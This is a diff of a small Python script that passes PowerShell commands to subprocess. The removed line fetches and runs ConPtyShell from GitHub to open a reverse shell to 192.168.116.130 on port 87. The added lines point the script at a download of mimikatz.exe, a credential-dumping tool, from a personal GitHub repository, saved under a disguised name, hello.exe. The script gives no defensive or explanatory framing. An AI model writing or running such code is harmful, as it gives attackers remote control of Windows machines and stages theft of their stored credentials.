@@ -1,7 +1,8 @@
 import subprocess
 
 #powershell command to execute
-COMMAND = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.116.130 87" 
+COMMAND = "mkdir C:\hello"
+COMMAND = "curl.exe -L https://github.com/asapthai34-svg/mimikatz/releases/download/mimikatz/mimikatz.exe -o C:\hello\hello.exe" 
  
  
 def run_powershell(command: str):
